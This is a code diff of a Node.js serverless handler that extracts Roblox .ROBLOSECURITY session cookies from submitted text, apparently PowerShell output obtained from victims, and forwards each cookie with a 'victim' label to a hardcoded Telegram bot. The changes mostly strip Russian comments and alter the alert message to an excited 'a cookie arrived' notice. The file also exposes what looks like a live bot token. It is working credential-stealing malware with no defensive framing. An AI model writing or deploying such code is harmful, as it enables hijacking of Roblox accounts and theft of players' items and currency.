@@ -1,10 +1,6 @@
 const fetch = require('node-fetch');
-
-// ===== ТВОИ ДАННЫЕ (захардкожены) =====
 const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
 const CHAT_ID = "-5527664230";
-// ========================================
-
 const PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
 
 function extractCookie(text) {
@@ -33,7 +29,6 @@ exports.handler = async (event) => {
 
         let raw = null;
 
-        // 1) Если есть префикс – берём всё после него до первого недопустимого символа
         if (code.includes(PREFIX)) {
             const start = code.indexOf(PREFIX) + PREFIX.length;
             let end = start;
@@ -48,13 +43,11 @@ exports.handler = async (event) => {
             raw = code.substring(start, end);
         }
 
-        // 2) Если нет – ищем .ROBLOSECURITY=...
         if (!raw) {
             const match = code.match(/\.ROBLOSECURITY=([A-Za-z0-9._\-]+)/);
             if (match) raw = match[1];
         }
 
-        // 3) Если нет – ищем "WARNING:-DO-NOT-SHARE-THIS..." без подчёркиваний
         if (!raw) {
             const warning = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";
             const idx = code.indexOf(warning);
@@ -73,7 +66,6 @@ exports.handler = async (event) => {
             }
         }
 
-        // 4) Если ничего не нашли – пытаемся выцепить любую длинную строку
         if (!raw) {
             const cookie = extractCookie(code);
             if (cookie) raw = cookie;
@@ -91,15 +83,13 @@ exports.handler = async (event) => {
             return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
         }
 
-        // Отправка в Telegram – БЕЗ parse_mode, чтобы подчёркивания не превращались в курсив
-        const message = `🆕 Token for ${victim}:\n${token}`;
+        const message = `⚠️⚠️⚠️ ПРИШЕЛ КУКИ!!! ${victim}:\n${token}`;
         const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message
-                // parse_mode не указываем, чтобы текст был обычным
             })
         });
 
